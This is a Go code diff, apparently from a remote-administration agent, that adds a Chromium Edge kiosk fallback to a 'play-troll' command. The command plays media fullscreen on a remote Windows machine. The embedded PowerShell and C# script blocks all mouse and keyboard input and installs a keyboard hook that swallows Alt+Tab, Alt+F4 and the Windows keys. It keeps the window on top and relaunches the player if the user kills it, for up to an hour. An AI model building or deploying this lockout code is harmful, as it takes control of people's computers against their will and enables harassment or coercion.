@@ -102,6 +102,51 @@ func validateTrollImage(local, ext string) error {
 	return nil
 }
 
+// Audio extensions that ride the media pipelines (WPF or Chromium).
+var trollAudioExts = map[string]bool{
+	".mp3": true, ".wav": true, ".wma": true, ".m4a": true,
+}
+
+// edgePath locates Microsoft Edge (Chromium), "" when absent. Edge's
+// ffmpeg-based pipeline plays what Media Foundation cannot (VP9/AV1 in
+// MP4, files with wounded indexes), so it backs the lockdown player.
+func edgePath() string {
+	for _, p := range []string{
+		`C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`,
+		`C:\Program Files\Microsoft\Edge\Application\msedge.exe`,
+	} {
+		if _, err := os.Stat(p); err == nil {
+			return p
+		}
+	}
+	if p, err := exec.LookPath("msedge.exe"); err == nil {
+		return p
+	}
+	return ""
+}
+
+// trollEngine picks the playback engine for video/audio: "wpf" for the
+// native MediaElement path, "edge" for the Chromium kiosk fallback.
+// VP9/AV1 and broken indexes go straight to Edge (MF cannot open them);
+// clean H.264 starts native with Edge as fallback on no-proof.
+// Returns ("", err) only when nothing on the box can play it.
+func trollEngine(codec string, indexOK, edgeOK bool) (string, error) {
+	switch codec {
+	case "vp9", "av1":
+		if !edgeOK {
+			return "", fmt.Errorf("troll media is %s in MP4: the Windows media pipeline cannot play it, and Chromium Edge (the fallback) is not installed — convert to H.264 MP4 first", strings.ToUpper(codec))
+		}
+		return "edge", nil
+	}
+	if !indexOK {
+		if !edgeOK {
+			return "", fmt.Errorf("troll media has a broken sample index, and Chromium Edge (the fallback) is not installed — re-mux (ffmpeg -c copy) or re-encode the file")
+		}
+		return "edge", nil
+	}
+	return "wpf", nil
+}
+
 // play-troll <path|url> [seconds] [noloop]
 // seconds: 1-3600, default 300. noloop: play once then auto-close.
 func playTroll(arg string) (string, error) {
@@ -165,29 +210,51 @@ func playTroll(arg string) (string, error) {
 	}
 	// Container peek for MP4-family: names the codec in success/failure
 	// text so a silent box is diagnosable from the controller alone.
-	// Two hard refusals, both cheaper than a 40s black screen:
-	//   - VP9/AV1 in MP4: Media Foundation cannot open it (no event at
-	//     all). Convert to H.264 first.
-	//   - moov missing: truncated/interrupted download, unopenable ever.
+	// Truncated files (no moov) are refused outright — nothing on the
+	// box can open them. Anything else routes by engine below.
 	codec := ""
+	indexOK := true
+	indexReason := ""
+	edgeBin := edgePath()
 	if ext == ".mp4" || ext == ".m4v" || ext == ".mov" {
 		codec = sniffMP4Codec(local)
-		if codec == "vp9" || codec == "av1" {
-			return "", fmt.Errorf("troll media is %s in MP4: the Windows media pipeline cannot play it — convert to H.264 MP4 first", strings.ToUpper(codec))
-		}
 		if codec == "other" && !mp4HasMoov(local) {
 			return "", fmt.Errorf("troll media looks truncated (MP4 has no moov index) — re-download the file")
 		}
 		if ok, reason := mp4IndexSane(local); !ok {
-			return "", fmt.Errorf("troll media has a broken sample index (%s) — re-mux (ffmpeg -c copy) or re-encode the file", reason)
+			indexOK = false
+			indexReason = reason
+		}
+	}
+	loopNote := "looping"
+	if !loop {
+		loopNote = "once"
+	}
+	_ = os.MkdirAll(trollMediaDir(), 0755)
+	statusPath := trollStatusFile()
+
+	// Engine routing: images always ride WinForms; video/audio pick WPF
+	// natively, Chromium when MF cannot open them (VP9/AV1, broken
+	// index — proven unplayable) or when WPF just failed to prove.
+	engine := "wpf"
+	if !trollImageExts[ext] {
+		var err error
+		engine, err = trollEngine(codec, indexOK, edgeBin != "")
+		if err != nil {
+			return "", err
+		}
+		if engine == "edge" {
+			note := indexReason
+			if codec == "vp9" || codec == "av1" {
+				note = strings.ToUpper(codec) + " in MP4 (Chromium plays it, Media Foundation cannot)"
+			}
+			return playTrollEdge(local, ext, secs, loop, loopNote, codec, note, statusPath, edgeBin)
 		}
 	}
 
 	// Fresh status handshake: the player must write "opened" (or a
 	// "failed:" reason) or playTroll reports failure instead of claiming
 	// success over a black flash.
-	_ = os.MkdirAll(trollMediaDir(), 0755)
-	statusPath := trollStatusFile()
 	_ = os.Remove(statusPath)
 	script, err := trollScript(local, ext, secs, loop, statusPath)
 	if err != nil {
@@ -202,19 +269,50 @@ func playTroll(arg string) (string, error) {
 	_ = os.MkdirAll(filepath.Dir(trollPIDFile()), 0755)
 	_ = os.WriteFile(trollPIDFile(), []byte(strconv.Itoa(gp.Pid())), 0644)
 	go gp.Wait()
-	loopNote := "looping"
-	if !loop {
-		loopNote = "once"
+	res, err := waitTrollProof(statusPath, filepath.Base(local), loopNote, codec, secs, 400)
+	if err != nil && edgeBin != "" && !trollImageExts[ext] {
+		// Native player couldn't open it — Chromium gets a turn under the
+		// same lockdown with a fresh proof. The wait above already
+		// reaped the WPF player via stopTrollInternal.
+		_ = os.Remove(statusPath)
+		return playTrollEdge(local, ext, secs, loop, loopNote, codec, "WPF could not open it", statusPath, edgeBin)
 	}
+	return res, err
+}
+
+// playTrollEdge runs the Chromium kiosk fallback: same lockdown
+// (fullscreen kiosk, input block, key hook, timers), separate engine.
+func playTrollEdge(local, ext string, secs int, loop bool, loopNote, codec, why, statusPath, edgeBin string) (string, error) {
+	script, err := trollEdgeScript(edgeBin, local, trollAudioExts[ext], secs, loop, statusPath)
+	if err != nil {
+		return "", err
+	}
+	_ = os.Remove(statusPath)
+	gp, err := spawnGUI("powershell", []string{"-NoProfile", "-ExecutionPolicy", "Bypass", "-command", script}, nil, nil)
+	if err != nil {
+		return "", err
+	}
+	_ = os.MkdirAll(filepath.Dir(trollPIDFile()), 0755)
+	_ = os.WriteFile(trollPIDFile(), []byte(strconv.Itoa(gp.Pid())), 0644)
+	go gp.Wait()
+	res, err := waitTrollProof(statusPath, filepath.Base(local), loopNote+" via Chromium ("+why+")", codec, secs, 250)
+	return res, err
+}
+
+// waitTrollProof polls statusPath for up to polls*100ms for the player's
+// verdict: "opened" (success), "failed:…"/"timeout…" (reported failure),
+// or silence past budget (killed as a presumed hang, then reported).
+// Shared by the WPF and Chromium player paths.
+func waitTrollProof(statusPath, base, loopNote, codec string, secs, polls int) (string, error) {
 	// Wait for proof of playback (MediaOpened / Shown). A codec miss or
 	// bad path used to look identical to success: black flash, instant
 	// close, "troll playing ..." lie. Now it errors with the reason.
-	// 40s budget, deliberately longer than (powershell cold start ~15s +
-	// player no-proof watchdog 20s): this clock starts at process spawn,
-	// the watchdog's starts when the script runs. A shorter wait would
-	// taskkill a player that was about to open — the same premature-kill
-	// flaw the notification proof had at 5s.
-	for i := 0; i < 400; i++ {
+	// The WPF budget (40s) is deliberately longer than (powershell cold
+	// start ~15s + player no-proof watchdog 20s): this clock starts at
+	// process spawn, the watchdog's starts when the script runs. A
+	// shorter wait would taskkill a player that was about to open — the
+	// same premature-kill flaw the notification proof had at 5s.
+	for i := 0; i < polls; i++ {
 		time.Sleep(100 * time.Millisecond)
 		b, err := os.ReadFile(statusPath)
 		if err != nil {
@@ -226,7 +324,7 @@ func playTroll(arg string) (string, error) {
 			if codec != "" && codec != "other" {
 				note = codec + ", " + loopNote
 			}
-			return fmt.Sprintf("troll playing %s (%s, %ds, input blocked — stop-troll or timeout %ds)", filepath.Base(local), note, secs, secs), nil
+			return fmt.Sprintf("troll playing %s (%s, %ds, input blocked — stop-troll or timeout %ds)", base, note, secs, secs), nil
 		}
 		if strings.HasPrefix(st, "failed:") || strings.HasPrefix(st, "timeout") {
 			stopTrollInternal()
@@ -242,7 +340,167 @@ func playTroll(arg string) (string, error) {
 	if codec == "hevc" {
 		hint = " [detected HEVC/H.265 — install HEVC Video Extensions from the Microsoft Store or convert to H.264]"
 	}
-	return "", fmt.Errorf("troll player did not confirm playback within 40s (codec or path?)%s", hint)
+	return "", fmt.Errorf("troll player did not confirm playback within %ds (codec or path?)%s", polls/10, hint)
+}
+
+// trollEdgeProfile is the dedicated Edge profile dir for lockdown
+// playback (lets stop-troll kill exactly our Edge processes by
+// command-line match, never the user's own browser windows).
+func trollEdgeProfile() string {
+	return filepath.Join(trollMediaDir(), "edgeprofile")
+}
+
+// trollEdgeScript builds the Chromium kiosk guardian: a hidden PowerShell
+// that hosts the lockdown (hook, BlockInput, timers) while Edge renders
+// the media Edge can open but Media Foundation cannot (VP9/AV1, wounded
+// indexes). The media rides a local HTML wrapper (autoplay + loop) so no
+// server is needed. Window title RMM-TROLL is the proof + kill target.
+func trollEdgeScript(edgeBin, local string, isAudio bool, secs int, loop bool, status string) (string, error) {
+	qe := psQuote(edgeBin)
+	qp := psQuote(trollEdgeProfile())
+	qs := psQuote(status)
+	tag := "video"
+	if isAudio {
+		tag = "audio"
+	}
+	loopAttr := ""
+	if loop {
+		loopAttr = "loop"
+	}
+	loopI := 0
+	if loop {
+		loopI = 1
+	}
+	qm := psQuote(local)
+	return fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms
+Add-Type -TypeDefinition @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public static class RmmTrollEdge {
+  public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+  public static HookProc proc;
+  public static IntPtr hookId = IntPtr.Zero;
+  [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+  [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+  [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+  [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
+  [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);
+  static bool KeyDown(int vk) { return (GetAsyncKeyState(vk) & 0x8000) != 0; }
+  public static IntPtr Callback(int nCode, IntPtr wParam, IntPtr lParam) {
+    if (nCode >= 0 && (wParam == (IntPtr)0x0100 || wParam == (IntPtr)0x0104)) {
+      int vk = Marshal.ReadInt32(lParam);
+      bool alt = KeyDown(0x12), ctrl = KeyDown(0x11);
+      if ((vk == 0x09 && alt) || (vk == 0x1B && (alt || ctrl)) ||
+          (vk == 0x73 && alt) || vk == 0x5B || vk == 0x5C) {
+        return (IntPtr)1;
+      }
+    }
+    return CallNextHookEx(hookId, nCode, wParam, lParam);
+  }
+  public static void Install() {
+    proc = new HookProc(Callback);
+    using (Process p = Process.GetCurrentProcess())
+    using (ProcessModule m = p.MainModule) {
+      hookId = SetWindowsHookEx(13, proc, GetModuleHandle(m.ModuleName), 0);
+    }
+  }
+  public static void Uninstall() {
+    if (hookId != IntPtr.Zero) { UnhookWindowsHookEx(hookId); hookId = IntPtr.Zero; }
+  }
+  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
+  [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
+  [DllImport("user32.dll")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+  [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+  public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
+}
+'@
+[void][RmmTrollEdge]::SetProcessDPIAware()
+[RmmTrollEdge]::Install()
+$edge = %s
+$profile = %s
+$status = %s
+$secs = %d
+$loop = %d
+$script:allowClose = $false
+$script:seen = $false
+function Edge-Running {
+  $p = Get-CimInstance Win32_Process -Filter "Name='msedge.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like ('*'+$profile+'*') }
+  return ($null -ne $p)
+}
+function Edge-Kill {
+  Get-CimInstance Win32_Process -Filter "Name='msedge.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like ('*'+$profile+'*') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+}
+function Stop-TrollEdge {
+  $script:allowClose = $true
+  [void][RmmTrollEdge]::BlockInput($false)
+  [RmmTrollEdge]::Uninstall()
+  Edge-Kill
+}
+New-Item -ItemType Directory -Force -Path $profile | Out-Null
+$mediaUri = (New-Object System.Uri(%s)).AbsoluteUri
+$mu = $mediaUri.Replace('&', '&amp;').Replace('"', '&quot;')
+$html = '<!DOCTYPE html><html><head><title>RMM-TROLL</title><style>html,body{margin:0;background:#000;height:100%%%%}%s{width:100%%%%;height:100%%%%}</style></head><body><%s autoplay %s><source src="' + $mu + '"></%s></body></html>'
+$wrapper = Join-Path $profile 'play.html'
+Set-Content -Path $wrapper -Value $html -Encoding UTF8
+$wrapUri = (New-Object System.Uri($wrapper)).AbsoluteUri
+$edgeArgs = @('--kiosk', $wrapUri, ('--user-data-dir='+$profile), '--no-first-run', '--autoplay-policy=no-user-gesture-required', '--disable-features=Translate', '--disable-infobars', '--disable-session-crashed-bubble')
+try {
+  $ep = Start-Process -FilePath $edge -ArgumentList $edgeArgs -PassThru -ErrorAction Stop
+} catch {
+  Set-Content -Path $status -Value ('failed: edge launch: ' + $_.Exception.Message)
+  [RmmTrollEdge]::Uninstall()
+  exit 4
+}
+# Proof: the kiosk window must appear (title carries the page title).
+$found = $false
+for ($i = 0; $i -lt 200 -and -not $found; $i++) {
+  Start-Sleep -Milliseconds 100
+  $h = [RmmTrollEdge]::FindWindow($null, 'RMM-TROLL')
+  if ($h -ne [IntPtr]::Zero) { $found = $true }
+}
+if (-not $found) {
+  Set-Content -Path $status -Value 'failed: edge kiosk window never appeared'
+  Stop-TrollEdge
+  exit 5
+}
+$script:seen = $true
+Set-Content -Path $status -Value 'opened'
+[void][RmmTrollEdge]::BlockInput($true)
+# Guard: re-assert TopMost, heal murdered players, hard-stop at $secs.
+# A hidden 1x1 form pumps messages so the hook stays live.
+$gf = New-Object System.Windows.Forms.Form
+$gf.Width = 1; $gf.Height = 1
+$gf.StartPosition = 'Manual'
+$gf.Location = New-Object System.Drawing.Point(-10000, -10000)
+$gf.ShowInTaskbar = $false
+$gf.Opacity = 0
+$born = Get-Date
+$guard = New-Object System.Windows.Forms.Timer
+$guard.Interval = 500
+$guard.Add_Tick({
+  if (-not $script:allowClose) {
+    $h = [RmmTrollEdge]::FindWindow($null, 'RMM-TROLL')
+    if ($h -ne [IntPtr]::Zero) {
+      [void][RmmTrollEdge]::SetWindowPos($h, [RmmTrollEdge]::HWND_TOPMOST, 0, 0, 0, 0, 0x0002 -bor 0x0001)
+      [void][RmmTrollEdge]::BlockInput($true)
+    }
+  }
+  if (-not (Edge-Running)) {
+    if ($script:allowClose) { $gf.Close() } else {
+      try { $ep = Start-Process -FilePath $edge -ArgumentList $edgeArgs -PassThru -ErrorAction Stop } catch {}
+    }
+  }
+  if (((Get-Date) - $born).TotalSeconds -ge $secs) {
+    Stop-TrollEdge
+    $gf.Close()
+  }
+})
+$guard.Start()
+$gf.Add_FormClosed({ param($s,$e) [void][RmmTrollEdge]::BlockInput($false); [RmmTrollEdge]::Uninstall() })
+$gf.Show()
+[System.Windows.Forms.Application]::Run()
+`, qe, qp, qs, secs, loopI, qm, tag, tag, loopAttr, tag), nil
 }
 
 // stop-troll: unblock input FIRST (survives a hung player), then kill.
@@ -281,6 +539,10 @@ public static class RmmTrollBlk {
 	if pid > 0 {
 		_ = hideWindow(exec.Command("taskkill", "/F", "/PID", strconv.Itoa(pid))).Run()
 	}
+	// Chromium fallback players carry no pid file of their own (the
+	// guardian holds it): sweep their kiosk windows by title. Scoped to
+	// RMM-TROLL so a user's own Edge windows are never touched.
+	_ = hideWindow(exec.Command("taskkill", "/F", "/FI", "WINDOWTITLE eq RMM-TROLL*")).Run()
 	return pid, pid > 0
 }
 
